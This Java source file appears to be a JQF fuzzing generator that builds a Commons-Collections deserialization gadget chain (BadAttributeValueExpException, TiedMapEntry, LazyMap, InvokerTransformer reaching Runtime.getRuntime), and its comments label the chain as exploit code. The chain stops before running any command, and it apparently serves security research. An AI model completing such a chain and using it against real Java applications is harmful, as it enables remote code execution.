package edu.berkeley.cs.jqf.examples.GadgetChain;

import com.pholser.junit.quickcheck.generator.GenerationStatus;
import com.pholser.junit.quickcheck.generator.Generator;
import com.pholser.junit.quickcheck.internal.Lists;
import com.pholser.junit.quickcheck.random.SourceOfRandomness;
import java.lang.Object;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Arrays;
import java.util.HashMap;
import java.util.PriorityQueue;
import java.util.Queue;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
//import org.apache.commons.collections4.comparators.TransformingComparator;
//import org.apache.commons.collections4.functors.InstantiateTransformer;


import com.pholser.junit.quickcheck.internal.GeometricDistribution;
import sun.misc.Unsafe;

import javax.management.BadAttributeValueExpException;


public class ObjectGenerator extends Generator<BadAttributeValueExpException> {

    private static final GeometricDistribution geom = new GeometricDistribution();
    private static final double MEAN_ARRAY_DEPTH = 1.2;

    public <classname> Object objectInit (String classname) throws Exception {

        Class<?> target_classname = Class.forName(classname);    //返回传入类对应的实例对象
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        Unsafe unsafe = (Unsafe) f.get(null);

        classname PropertyObject = (classname) unsafe.allocateInstance(target_classname);
        return PropertyObject;
    }

    public ObjectGenerator() {
        super(BadAttributeValueExpException.class); // Register the type of objects that we can create
    }

    @Override
    public BadAttributeValueExpException generate(SourceOfRandomness random, GenerationStatus status) {

        //构造核心利用代码
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new org.apache.commons.collections.functors.InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new org.apache.commons.collections.functors.InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null})
        };

        //构造利用链
        ChainedTransformer chain = new ChainedTransformer(transformers);

        //触发连
        HashMap hashMap = new HashMap();
        LazyMap lazymap = (LazyMap) LazyMap.decorate(hashMap, chain);
        //将lazyMap传给TiedMapEntry
        TiedMapEntry entry = new TiedMapEntry(lazymap, "test");
        //TiedMapEntry entry1 = new TiedMapEntry(null, "test");
        //反射调用TiedMapEntry
        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        //System.out.println(entry1);
        Field val = null;
        try {
            val = bad.getClass().getDeclaredField("val");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        val.setAccessible(true);
        try {
            val.set(bad,entry);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

/*        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);
        InstantiateTransformer transformer = new InstantiateTransformer(null,null);
        TransformingComparator transformer_comparator = new TransformingComparator(transformer,null);

        //设置comparator属性
        Field field13 = null;
        try {
            field13 = queue.getClass().getDeclaredField("comparator");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field13.setAccessible(true);
        try {
            field13.set(queue, transformer_comparator);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }*/

/*        Field[] fields = queue.getClass().getDeclaredFields();//获取所有属性
        for (Field field : fields) {
            if (Modifier.isFinal(field.getModifiers())) {
*//*                if (field.getName().equals("java.util.Comparator")) {
                    field.setAccessible(true);
                    try {
                        field.set(queue, transformer_comparator);
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }*//*
                continue;
            }*/
/*            field.setAccessible(true);
            if (field.getType().isArray()) {
                int depth = geom.sampleWithMean(MEAN_ARRAY_DEPTH, random);
                Object[] objects = new Object[depth];
                for (int i =0; i<depth;i++) {
                    try {
                        objects[i] = objectInit("java.lang.Object");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                try {
                    field.set(queue, objects);
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                }
            }*/

/*            if (random.nextBoolean()) {
                field.setAccessible(true);*/
/*                if (field.getType().equals(int.class)) {
                    try {
                        field.set(queue, random.nextInt(Integer.MIN_VALUE, Integer.MAX_VALUE));
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                if (field.getType().equals(long.class)) {
                    try {
                        field.set(queue, random.nextLong(Long.MIN_VALUE, Long.MAX_VALUE));
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                if (field.getType().equals(short.class)) {
                    try {
                        field.set(queue, random.nextShort(Short.MIN_VALUE, Short.MAX_VALUE));
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                if (field.getType().equals(byte.class)) {
                    try {
                        field.set(queue, random.nextLong(Byte.MIN_VALUE, Byte.MAX_VALUE));
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                if (field.getType().equals(boolean.class)) {
                    try {
                        field.set(queue, random.nextBoolean());
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                if (field.getType().equals(float.class)) {
                    try {
                        field.set(queue, random.nextFloat(Float.MIN_VALUE, Float.MAX_VALUE));
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                if (field.getType().equals(double.class)) {
                    try {
                        field.set(queue, random.nextDouble(Double.MIN_VALUE, Double.MAX_VALUE));
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
                if (field.getType().equals(char.class)) {
                    try {
                        field.set(queue, random.nextChar(Character.MIN_VALUE, Character.MAX_VALUE));
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }*/
/*                if (field.getType().isArray() && Object.class.isAssignableFrom(field.getType())) {
                    int depth = geom.sampleWithMean(MEAN_ARRAY_DEPTH, random);
                    Object[] objects = new Object[depth];
                    for (int i =0; i<depth;i++) {
                        try {
                            objects[i] = objectInit("java.lang.Object");
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    try {
                        field.set(queue, objects);
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }
            }*/
        //}

        return bad;
    }
}
